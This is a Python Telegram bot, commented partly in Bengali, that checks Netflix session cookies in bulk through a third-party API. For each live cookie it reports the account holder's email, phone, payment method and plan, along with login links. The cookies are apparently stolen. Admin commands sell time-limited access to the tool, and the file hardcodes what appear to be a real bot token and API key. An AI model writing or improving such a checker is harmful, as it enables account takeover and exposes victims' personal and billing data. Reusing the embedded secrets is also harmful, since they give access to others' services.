import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from datetime import datetime, timezone, timedelta
import threading
import time
import os
import urllib.request
import json
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

# ==========================================
# CONFIGURATION
# ==========================================
TELEGRAM_BOT_TOKEN = "8760206960:AAHr1FXrvbcS_kN9lLb4lP3RgePfuzD1GtA"
NFTOKEN_API_KEY = "NFK_bad33af49307ae835f60f09e"
API_URL = "https://nftoken.site/v1/api.php"

# ---------- PERMANENT ADMINS (এই আইডিরা সব সময় ফুল অ্যাক্সেস পাবেন) ----------
ADMIN_IDS = [6552783238, 1700797877]   # আপনার আইডি এবং অন্য অ্যাডমিন আইডি দিন

# ---------- টেম্পোরারি ইউজার ডাটা সংরক্ষণের JSON ফাইল ----------
ACCESS_FILE = "user_access.json"

# ---------- TIMEZONE: BANGLADESH (UTC+6) ----------
BD_TZ = timezone(timedelta(hours=6))

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ------------------- লক (কনকারেন্ট রাইটিং এড়াতে) -------------------
file_lock = threading.Lock()

# ------------------- টেম্পোরারি অ্যাক্সেস ডাটা লোড/সেভ -------------------
def load_access_data():
    if not os.path.exists(ACCESS_FILE):
        return {}
    with open(ACCESS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_access_data(data):
    with file_lock:
        with open(ACCESS_FILE, 'w') as f:
            json.dump(data, f, indent=2)

# ------------------- ডিউরেশন পার্স করার ফাংশন -------------------
def parse_duration(duration_str):
    match = re.match(r'(\d+)([smhdwM])', duration_str)
    if not match:
        return None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return value
    elif unit == 'm':
        return value * 60
    elif unit == 'h':
        return value * 3600
    elif unit == 'd':
        return value * 86400
    elif unit == 'w':
        return value * 7 * 86400
    elif unit == 'M':
        return value * 30 * 86400
    else:
        return None

# ------------------- ইউজার অথরাইজেশন চেক -------------------
def is_authorized(user_id):
    if user_id in ADMIN_IDS:
        return True
    data = load_access_data()
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    now_ts = int(time.time())
    expiry = user_data.get("expiry", 0)
    remaining = user_data.get("remaining", 0)
    if now_ts > expiry:
        # মেয়াদ শেষ, ডাটা মুছে ফেলি
        if str(user_id) in data:
            del data[str(user_id)]
            save_access_data(data)
        return False
    if remaining <= 0:
        return False
    return True

def decrement_usage(user_id):
    if user_id in ADMIN_IDS:
        return
    data = load_access_data()
    key = str(user_id)
    if key not in data:
        return
    remaining = data[key].get("remaining", 0)
    if remaining > 0:
        data[key]["remaining"] = remaining - 1
        if data[key]["remaining"] == 0:
            del data[key]
        save_access_data(data)

def get_user_access_info(user_id):
    if user_id in ADMIN_IDS:
        return "👑 *Admin* – unlimited access, no expiry."
    data = load_access_data()
    user_data = data.get(str(user_id))
    if not user_data:
        return "❌ No temporary access."
    now_ts = int(time.time())
    expiry = user_data.get("expiry", 0)
    remaining = user_data.get("remaining", 0)
    if now_ts > expiry:
        return "⏰ Access expired."
    remaining_time_sec = expiry - now_ts
    days = remaining_time_sec // 86400
    hours = (remaining_time_sec % 86400) // 3600
    minutes = (remaining_time_sec % 3600) // 60
    time_str = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
    return f"⏳ *Expires in:* {time_str}\n🔄 *Remaining uses:* {remaining}"

# ------------------- অ্যাডমিন কমান্ড -------------------
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Only admins can add users.")
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ Usage: `/adduser <user_id> <duration> <max_uses>`\nExamples:\n`/adduser 123456789 24h 5`\n`/adduser 987654321 2d 1`\n`/adduser 555555555 1M 20`\n\nDuration format: `s`, `m`, `h`, `d`, `w`, `M` (month = 30 days)", parse_mode="Markdown")
        return
    try:
        user_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID.")
        return
    duration_str = parts[2]
    try:
        max_uses = int(parts[3])
    except:
        bot.reply_to(message, "❌ Max uses must be a number.")
        return
    seconds = parse_duration(duration_str)
    if seconds is None:
        bot.reply_to(message, "❌ Invalid duration. Use e.g., 30s, 5m, 2h, 3d, 1w, 1M")
        return
    expiry_ts = int(time.time()) + seconds
    data = load_access_data()
    data[str(user_id)] = {
        "expiry": expiry_ts,
        "remaining": max_uses
    }
    save_access_data(data)
    bot.reply_to(message, f"✅ Added user `{user_id}`\n⏳ Duration: {duration_str}\n🔄 Uses: {max_uses}", parse_mode="Markdown")

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Only admins can remove users.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ Usage: `/removeuser <user_id>`", parse_mode="Markdown")
        return
    try:
        user_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID.")
        return
    data = load_access_data()
    key = str(user_id)
    if key in data:
        del data[key]
        save_access_data(data)
        bot.reply_to(message, f"✅ Removed user `{user_id}`.", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"⚠️ User `{user_id}` not found in temporary access list.", parse_mode="Markdown")

@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ Only admins can list users.")
        return
    data = load_access_data()
    if not data:
        bot.reply_to(message, "No temporary users.")
        return
    lines = []
    now_ts = int(time.time())
    for uid, info in data.items():
        expiry = info.get("expiry", 0)
        remaining = info.get("remaining", 0)
        if now_ts > expiry:
            continue
        remaining_sec = expiry - now_ts
        days = remaining_sec // 86400
        hours = (remaining_sec % 86400) // 3600
        time_left = f"{days}d {hours}h" if days > 0 else f"{hours}h"
        lines.append(f"🆔 `{uid}` | uses left: {remaining} | expires in: {time_left}")
    if not lines:
        bot.reply_to(message, "No active temporary users.")
    else:
        bot.reply_to(message, "📋 *Active temporary users:*\n" + "\n".join(lines), parse_mode="Markdown")

@bot.message_handler(commands=['myaccess'])
def my_access(message):
    info = get_user_access_info(message.from_user.id)
    bot.reply_to(message, info, parse_mode="Markdown")

# ------------------- HTTP Server for Render -------------------
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is running and healthy")
    def log_message(self, format, *args):
        pass

def run_http_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    print(f"✅ HTTP server listening on port {port}")
    server.serve_forever()

def keep_alive():
    time.sleep(60)
    while True:
        try:
            port = int(os.environ.get("PORT", 10000))
            urllib.request.urlopen(f"http://0.0.0.0:{port}", timeout=10)
            print("🔄 Self-ping successful")
        except Exception as e:
            print(f"⚠️ Self-ping failed: {e}")
        time.sleep(240)

# ------------------- Helper: Get Bangladesh Time -------------------
def get_bd_time():
    return datetime.now(BD_TZ).strftime("%m/%d/%Y, %I:%M:%S %p")

# ------------------- Function to Check Single Cookie -------------------
def check_single_cookie(cookie_text):
    payload = {
        "key": NFTOKEN_API_KEY,
        "cookie": cookie_text
    }
    try:
        response = requests.post(API_URL, json=payload, timeout=20)
        data = response.json()
        return data
    except Exception:
        return {"status": "ERROR", "message": "API connection failed"}

# ------------------- Send full formatted message for a live cookie -------------------
def send_live_cookie_result(chat_id, data):
    email = data.get("x_mail", "N/A")
    plan = data.get("x_tier", "Unknown")
    country = data.get("x_loc", "N/A")
    renewal = data.get("x_ren", "N/A")
    since = data.get("x_mem", "N/A")
    payment = data.get("x_bil", "N/A")
    phone = data.get("x_tel", "N/A")
    profiles = data.get("x_usr", "N/A")
    profile_names = data.get("x_profiles", "N/A")
    pc_link = data.get("x_l1", "#")
    mobile_link = data.get("x_l2", "#")
    tv_link = data.get("x_l3", "#")
    now = get_bd_time()

    result_text = (
        f"✅ *NETFLIX ACCOUNT INFO* ✅\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🌍 *Country:* `{country}`\n"
        f"📺 *Plan:* `{plan}`\n"
        f"📅 *Renewal Date:* `{renewal}`\n"
        f"🎂 *Member Since:* `{since}`\n"
        f"💳 *Payment:* `{payment}`\n"
        f"📱 *Phone:* `{phone}`\n"
        f"👥 *Profiles:* `{profiles}`\n"
        f"👤 *Profile Names:* `{profile_names}`\n\n"
        f"🔒 *Status:* Active ✅\n"
        f"⏰ *Checked:* `{now}`\n"
    )

    markup = InlineKeyboardMarkup()
    buttons = []
    if pc_link.startswith("http"):
        buttons.append(InlineKeyboardButton("💻 PC", url=pc_link))
    if mobile_link.startswith("http"):
        buttons.append(InlineKeyboardButton("📱 Mobile", url=mobile_link))
    if tv_link.startswith("http"):
        buttons.append(InlineKeyboardButton("📺 TV", url=tv_link))
    if buttons:
        markup.row(*buttons)

    bot.send_message(chat_id, result_text, parse_mode="Markdown", reply_markup=markup if buttons else None)

# ------------------- Telegram Handlers (অথরাইজেশন চেক যুক্ত) -------------------
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    # সাধারণ ইউজারদের জন্য কমান্ড
    user_commands = (
        "📌 *Available Commands:*\n\n"
        "🔹 `/start` or `/help` – Show this help message\n"
        "🔹 `/myaccess` – Check your remaining time & usage limit\n\n"
        "📤 *How to use:*\n"
        "▪ Send a *Netflix cookie* (JSON or Netscape format) – I'll check it and show full info if live.\n"
        "▪ Send a `.txt` file with one cookie per line – I'll check all and show results for live cookies only.\n"
    )
    
    if message.from_user.id in ADMIN_IDS:
        admin_commands = (
            "\n👑 *Admin Commands:*\n\n"
            "🔹 `/adduser <user_id> <duration> <max_uses>` – Grant temporary access\n"
            "   Example: `/adduser 123456789 24h 5` (24 hours, 5 uses)\n"
            "   Duration formats: `30s`, `5m`, `2h`, `3d`, `1w`, `1M` (month=30 days)\n\n"
            "🔹 `/removeuser <user_id>` – Remove a temporary user\n"
            "🔹 `/listusers` – List all active premium users\n"
        )
        welcome_text = user_commands + admin_commands
    else:
        welcome_text = user_commands

    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Handle single cookie as text message
@bot.message_handler(func=lambda message: True, content_types=['text'])
def check_cookie(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    raw_text = message.text.strip()
    # Skip command messages
    if raw_text.startswith('/'):
        return
    if "netflix" not in raw_text.lower() and "NetflixId" not in raw_text and "{" not in raw_text:
        bot.reply_to(message, "❌ Please send a valid cookie string (or .txt file).")
        return

    status_msg = bot.reply_to(message, "⏳ *Checking cookie...*", parse_mode="Markdown")
    data = check_single_cookie(raw_text)

    if data.get("status") == "SUCCESS":
        bot.delete_message(message.chat.id, status_msg.message_id)
        send_live_cookie_result(message.chat.id, data)
        decrement_usage(message.from_user.id)
    elif data.get("status") == "ERROR" and data.get("message") and "rate" in data.get("message","").lower():
        bot.edit_message_text(f"🚫 *RATE LIMITED*\n{data.get('message')}", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
    else:
        error_msg = data.get("message", "Invalid or Dead Cookie")
        bot.edit_message_text(f"💀 *DEAD ACCOUNT*\n{error_msg}", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
        decrement_usage(message.from_user.id)

# Handle .txt file upload
@bot.message_handler(content_types=['document'])
def handle_txt_file(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    file_info = bot.get_file(message.document.file_id)
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a `.txt` file.")
        return

    downloaded_file = bot.download_file(file_info.file_path)
    try:
        content = downloaded_file.decode('utf-8')
        lines = content.splitlines()
    except Exception:
        bot.reply_to(message, "❌ Failed to read file. Make sure it's UTF-8 text.")
        return

    cookies = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if '\t' in line or (line.startswith('{') and line.endswith('}')) or 'SecureNetflixId' in line:
            cookies.append(line)

    if not cookies:
        bot.reply_to(message, "❌ No valid cookies found in the file.")
        return

    start_msg = bot.reply_to(message, f"📄 *Found {len(cookies)} cookies. Checking...*", parse_mode="Markdown")
    live_count = 0

    for cookie in cookies:
        data = check_single_cookie(cookie)
        if data.get("status") == "SUCCESS":
            live_count += 1
            send_live_cookie_result(message.chat.id, data)
        time.sleep(1)

    bot.delete_message(message.chat.id, start_msg.message_id)
    if live_count == 0:
        bot.send_message(message.chat.id, "✅ No live cookies found in the file.", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, f"✅ Done! Found {live_count} live cookies.", parse_mode="Markdown")

    decrement_usage(message.from_user.id)

# ------------------- Main -------------------
if __name__ == "__main__":
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    alive_thread = threading.Thread(target=keep_alive, daemon=True)
    alive_thread.start()
    
    print("✅ Bot is running with temporary access control, admin commands, and full file support.")
    bot.infinity_polling()
